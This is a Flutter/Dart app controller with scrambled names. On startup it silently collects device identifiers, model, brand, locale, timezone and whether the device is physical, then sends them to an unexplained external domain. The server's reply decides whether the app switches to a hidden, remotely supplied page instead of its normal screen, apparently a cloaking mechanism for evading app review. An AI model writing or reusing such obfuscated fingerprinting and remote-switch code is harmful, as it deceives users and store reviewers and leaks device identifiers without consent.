import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void notFound() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/not_found");
  }
}

class PageLogic extends GetxController {

  var qwjrpl = RxBool(false);
  var itqmkwb = RxBool(true);
  var agmkde = RxString("");
  var hubert = RxBool(false);
  var hartmann = RxBool(true);
  final avlhzx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    notFound();
    super.onInit();
    aomnupg();
  }


  Future<void> aomnupg() async {

    hubert.value = true;
    hartmann.value = true;
    itqmkwb.value = false;

    avlhzx.post("https://ky.newbandb.xyz/Rh0madelk1AKj",data: await zanyqjsrxv()).then((value) {
      var gfdjlna = value.data["gfdjlna"] as String;
      var jltr = value.data["jltr"] as bool;
      if (jltr) {
        agmkde.value = gfdjlna;
        lizeth();
      } else {
        luettgen();
      }
    }).catchError((e) {
      itqmkwb.value = true;
      hartmann.value = true;
      hubert.value = false;
    });
  }

  Future<Map<String, dynamic>> zanyqjsrxv() async {
    final DeviceInfoPlugin iwjxmlvz = DeviceInfoPlugin();
    PackageInfo ynqs_zkqu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var adgfw = Platform.localeName;
    var kaIOr = currentTimeZone;

    var oGISq = ynqs_zkqu.packageName;
    var YhlUsy = ynqs_zkqu.version;
    var HpcLONIo = ynqs_zkqu.buildNumber;

    var IyxPEWiq = ynqs_zkqu.appName;
    var JErwC = "";
    var hqcIfUp  = "";
    var crystalHarris = "";
    var MpgGZzhi = "";
    var venaLeannon = "";
    var lexusKris = "";
    var IPUuWqD = "";


    var alberthaGutmann = "";
    var dakotaWitting = "";
    var HEZdIaF = false;

    if (GetPlatform.isAndroid) {
      MpgGZzhi = "android";
      var vzjftbuh = await iwjxmlvz.androidInfo;

      IPUuWqD = vzjftbuh.brand;

      JErwC  = vzjftbuh.model;
      hqcIfUp = vzjftbuh.id;

      HEZdIaF = vzjftbuh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      MpgGZzhi = "ios";
      var bxfazgd = await iwjxmlvz.iosInfo;
      IPUuWqD = bxfazgd.name;
      JErwC = bxfazgd.model;

      hqcIfUp = bxfazgd.identifierForVendor ?? "";
      HEZdIaF  = bxfazgd.isPhysicalDevice;
    }
    var res = {
      "crystalHarris" : crystalHarris,
      "IyxPEWiq": IyxPEWiq,
      "HpcLONIo": HpcLONIo,
      "venaLeannon" : venaLeannon,
      "oGISq": oGISq,
      "kaIOr": kaIOr,
      "IPUuWqD": IPUuWqD,
      "dakotaWitting" : dakotaWitting,
      "hqcIfUp": hqcIfUp,
      "adgfw": adgfw,
      "MpgGZzhi": MpgGZzhi,
      "HEZdIaF": HEZdIaF,
      "YhlUsy": YhlUsy,
      "JErwC": JErwC,
      "alberthaGutmann" : alberthaGutmann,
      "lexusKris" : lexusKris,

    };
    return res;
  }

  Future<void> luettgen() async {
    Get.offAllNamed("/main");
  }

  Future<void> lizeth() async {
    Get.offAllNamed("/check");
  }
}
